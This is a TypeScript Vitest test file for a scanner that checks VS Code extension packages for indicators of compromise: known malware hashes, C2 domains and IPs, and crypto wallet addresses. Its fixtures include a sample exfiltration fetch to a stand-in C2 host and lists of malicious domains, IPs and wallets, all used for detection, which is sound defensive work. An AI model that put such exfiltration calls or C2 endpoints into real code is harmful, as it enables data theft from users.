import { describe, expect, it } from "vitest";
import type { VsixContents, VsixManifest, ZooData } from "../types.js";
import {
  checkDomains,
  checkHashes,
  checkIocs,
  checkIps,
  checkWallets,
  isLikelySolanaAddress,
} from "./ioc.js";

function makeContents(files: Record<string, string>): VsixContents {
  const manifest: VsixManifest = {
    name: "test",
    publisher: "test",
    version: "1.0.0",
  };
  const fileMap = new Map<string, Buffer>();
  fileMap.set("package.json", Buffer.from(JSON.stringify(manifest)));
  for (const [name, content] of Object.entries(files)) {
    fileMap.set(name, Buffer.from(content));
  }
  return {
    manifest,
    files: fileMap,
    basePath: "/test",
  };
}

function makeZooData(overrides: Partial<ZooData> = {}): ZooData {
  return {
    blocklist: [],
    hashes: new Set(),
    domains: new Set(),
    ips: new Set(),
    maliciousNpmPackages: new Set(),
    wallets: new Set(),
    blockchainAllowlist: new Set(),
    telemetryServices: new Map(),
    ...overrides,
  };
}

function makeContentsWithPublisher(
  files: Record<string, string>,
  publisher: string,
  name: string,
): VsixContents {
  const manifest: VsixManifest = {
    name,
    publisher,
    version: "1.0.0",
  };
  const fileMap = new Map<string, Buffer>();
  fileMap.set("package.json", Buffer.from(JSON.stringify(manifest)));
  for (const [fname, content] of Object.entries(files)) {
    fileMap.set(fname, Buffer.from(content));
  }
  return {
    manifest,
    files: fileMap,
    basePath: "/test",
  };
}

describe("checkHashes", () => {
  it("detects known malware hash", () => {
    const contents = makeContents({ "malware.js": "malicious code" });
    // Get hash of the malware.js file content
    const malwareHash = "69d58c3edfcb35a3b17e38b0ed3c86e8a5f5e5d0c7e9b8d7b4a3b2c1d0e9f8a7";
    const knownHashes = new Set([malwareHash]);

    // Compute the actual hash of "malicious code"
    const crypto = require("node:crypto");
    const actualHash = crypto.createHash("sha256").update("malicious code").digest("hex");
    knownHashes.add(actualHash);

    const findings = checkHashes(contents, knownHashes);
    expect(findings.some((f) => f.id === "KNOWN_MALWARE_HASH")).toBe(true);
    expect(findings[0]?.severity).toBe("critical");
  });

  it("does not flag unknown files", () => {
    const contents = makeContents({ "clean.js": "clean code" });
    const knownHashes = new Set([
      "0000000000000000000000000000000000000000000000000000000000000000",
    ]);

    const findings = checkHashes(contents, knownHashes);
    expect(findings).toHaveLength(0);
  });
});

describe("checkDomains", () => {
  it("detects known C2 domain in JS file", () => {
    const contents = makeContents({
      "extension.js": 'fetch("https://evil-c2.example.com/exfil")',
    });
    const knownDomains = new Set(["evil-c2.example.com"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(true);
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.metadata?.["domain"]).toBe("evil-c2.example.com");
  });

  it("detects domain in JSON file", () => {
    const contents = makeContents({
      "config.json": '{"url": "https://malware.badsite.net/api"}',
    });
    const knownDomains = new Set(["malware.badsite.net"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(true);
  });

  it("skips non-scannable files", () => {
    const contents = makeContents({
      "image.png": "evil-c2.example.com",
    });
    const knownDomains = new Set(["evil-c2.example.com"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings).toHaveLength(0);
  });

  it("does not flag unknown domains", () => {
    const contents = makeContents({
      "extension.js": 'fetch("https://api.github.com/repos")',
    });
    const knownDomains = new Set(["evil-c2.example.com"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings).toHaveLength(0);
  });
});

describe("checkIps", () => {
  it("detects known C2 IP address", () => {
    const contents = makeContents({
      "extension.js": 'const server = "185.234.123.45:8080";',
    });
    const knownIps = new Set(["185.234.123.45"]);

    const findings = checkIps(contents, knownIps);
    expect(findings.some((f) => f.id === "KNOWN_C2_IP")).toBe(true);
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.metadata?.["ip"]).toBe("185.234.123.45");
  });

  it("ignores private/localhost IPs", () => {
    const contents = makeContents({
      "extension.js": 'const local = "127.0.0.1"; const private = "192.168.1.1";',
    });
    const knownIps = new Set(["127.0.0.1", "192.168.1.1"]);

    const findings = checkIps(contents, knownIps);
    // These should be filtered out by isValidIp
    expect(findings).toHaveLength(0);
  });

  it("does not flag unknown IPs", () => {
    const contents = makeContents({
      "extension.js": 'const api = "8.8.8.8";',
    });
    const knownIps = new Set(["185.234.123.45"]);

    const findings = checkIps(contents, knownIps);
    expect(findings).toHaveLength(0);
  });
});

describe("checkWallets", () => {
  it("detects Bitcoin wallet address", () => {
    const contents = makeContents({
      "extension.js": `const addr = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";`,
    });

    const findings = checkWallets(contents, new Set());

    expect(findings).toHaveLength(1);
    expect(findings[0]?.id).toBe("CRYPTO_WALLET_DETECTED");
    expect(findings[0]?.severity).toBe("high");
    expect(findings[0]?.metadata?.["currency"]).toBe("BTC");
  });

  it("detects Ethereum wallet address", () => {
    const contents = makeContents({
      "extension.js": `const eth = "0x742d35Cc6634C0532925a3b844Bc9e7595f8fE42";`,
    });

    const findings = checkWallets(contents, new Set());

    expect(findings).toHaveLength(1);
    expect(findings[0]?.id).toBe("CRYPTO_WALLET_DETECTED");
    expect(findings[0]?.metadata?.["currency"]).toBe("ETH");
  });

  it("detects Solana wallet address", () => {
    const contents = makeContents({
      "extension.js": `const sol = "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC";`,
    });

    const findings = checkWallets(contents, new Set());

    expect(findings).toHaveLength(1);
    expect(findings[0]?.id).toBe("CRYPTO_WALLET_DETECTED");
    expect(findings[0]?.metadata?.["currency"]).toBe("SOL");
  });

  it("escalates known malicious wallet to critical", () => {
    const knownWallet = "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC";
    const contents = makeContents({
      "extension.js": `const payout = "${knownWallet}";`,
    });
    const knownWallets = new Set([knownWallet]);

    const findings = checkWallets(contents, knownWallets);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.id).toBe("KNOWN_MALWARE_WALLET");
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.metadata?.["knownMalicious"]).toBe(true);
  });

  it("skips non-scannable files", () => {
    const contents = makeContents({
      "image.png": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    });

    const findings = checkWallets(contents, new Set());

    expect(findings).toHaveLength(0);
  });
});

describe("checkIocs", () => {
  it("combines all IOC checks", () => {
    const contents = makeContents({
      "extension.js": 'fetch("https://evil.example.com"); const ip = "185.234.123.45";',
    });
    const zooData = makeZooData({
      domains: new Set(["evil.example.com"]),
      ips: new Set(["185.234.123.45"]),
    });

    const findings = checkIocs(contents, zooData);
    expect(findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(true);
    expect(findings.some((f) => f.id === "KNOWN_C2_IP")).toBe(true);
  });

  it("returns empty for clean extension", () => {
    const contents = makeContents({
      "extension.js": 'console.log("hello world");',
    });
    const zooData = makeZooData({
      domains: new Set(["evil.example.com"]),
      ips: new Set(["185.234.123.45"]),
      hashes: new Set(["0000000000000000000000000000000000000000000000000000000000000000"]),
    });

    const findings = checkIocs(contents, zooData);
    expect(findings).toHaveLength(0);
  });
});

describe("isLikelySolanaAddress", () => {
  it("returns true for real Solana addresses with digits distributed throughout", () => {
    // Real SOL address with digits distributed
    expect(isLikelySolanaAddress("FvGoyLXBSPu2pwx788zuWdCtWX7Hy9mwk")).toBe(true);
    expect(isLikelySolanaAddress("BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC")).toBe(true);
    // Address with digits early in string
    expect(isLikelySolanaAddress("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM")).toBe(true);
  });

  it("returns false for camelCase JS identifiers without digits", () => {
    // Common VS Code API identifiers that triggered false positives
    expect(isLikelySolanaAddress("registerDocumentSemanticTokensProvider")).toBe(false);
    expect(isLikelySolanaAddress("createDiagnosticCollection")).toBe(false);
    expect(isLikelySolanaAddress("onDidChangeConfiguration")).toBe(false);
    expect(isLikelySolanaAddress("executeDocumentSymbolProvider")).toBe(false);
  });

  it("returns false for identifiers with only trailing digits", () => {
    // JS identifiers with trailing numbers (e.g., Type2, Handler3)
    expect(isLikelySolanaAddress("DidChangeConfigurationNotification2")).toBe(false);
    expect(isLikelySolanaAddress("DocumentSymbolRequest1")).toBe(false);
    expect(isLikelySolanaAddress("CompletionItemKind25")).toBe(false);
  });

  it("returns false for strings with only one digit", () => {
    expect(isLikelySolanaAddress("registerDocument1SemanticTokensProvider")).toBe(false);
    expect(isLikelySolanaAddress("abc1defghijklmnopqrstuvwxyzabcdefgh")).toBe(false);
  });

  it("returns false for lowercase hex strings (git hashes, checksums)", () => {
    // Git commit hashes (40 hex chars)
    expect(isLikelySolanaAddress("7751e69b615c6eca6f783a81e292a55725af6b85")).toBe(false);
    expect(isLikelySolanaAddress("85d8f7c97ae473ccb9473f6c8d27e4ec957f4be1")).toBe(false);
    // Shorter integrity checksums
    expect(isLikelySolanaAddress("e69de29bb2d1d6434b8b29ae775ad8c2e48c5391")).toBe(false);
    expect(isLikelySolanaAddress("82f85941b4acf562dfb6bb4d69f2d842")).toBe(false);
  });

  it("returns false for identifiers without uppercase letters", () => {
    // Pure lowercase strings should be rejected
    expect(isLikelySolanaAddress("fromcertificatewithsha256thumbprint")).toBe(false);
    expect(isLikelySolanaAddress("pubbbf48e6d78dae54bceaa4acf463299bf")).toBe(false);
  });
});

describe("checkWallets blockchain allowlist", () => {
  it("skips wallet detection for allowlisted blockchain extensions", () => {
    const contents = makeContentsWithPublisher(
      {
        "extension.js": `const ens = "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e";`,
      },
      "JuanBlanco",
      "solidity",
    );
    const allowlist = new Set(["JuanBlanco.solidity"]);

    const findings = checkWallets(contents, new Set(), allowlist);

    expect(findings).toHaveLength(0);
  });

  it("detects wallets in non-allowlisted extensions", () => {
    const contents = makeContentsWithPublisher(
      {
        "extension.js": `const eth = "0x742d35Cc6634C0532925a3b844Bc9e7595f8fE42";`,
      },
      "unknown",
      "suspicious",
    );
    const allowlist = new Set(["JuanBlanco.solidity"]);

    const findings = checkWallets(contents, new Set(), allowlist);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.id).toBe("CRYPTO_WALLET_DETECTED");
  });

  it("detects wallets when allowlist is undefined", () => {
    const contents = makeContentsWithPublisher(
      {
        "extension.js": `const eth = "0x742d35Cc6634C0532925a3b844Bc9e7595f8fE42";`,
      },
      "unknown",
      "extension",
    );

    const findings = checkWallets(contents, new Set(), undefined);

    expect(findings).toHaveLength(1);
  });
});

describe("checkWallets SOL validation", () => {
  it("filters out JS identifiers that match SOL pattern", () => {
    const contents = makeContents({
      "extension.js": `
        vscode.languages.registerDocumentSemanticTokensProvider();
        const handler = DidChangeConfigurationNotification2;
      `,
    });

    const findings = checkWallets(contents, new Set());

    // Should not flag any of these as SOL wallets
    expect(findings).toHaveLength(0);
  });

  it("detects real Solana addresses with digits distributed", () => {
    const contents = makeContents({
      "extension.js": `const wallet = "FvGoyLXBSPu2pwx788zuWdCtWX7Hy9mwk";`,
    });

    const findings = checkWallets(contents, new Set());

    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.["currency"]).toBe("SOL");
  });
});
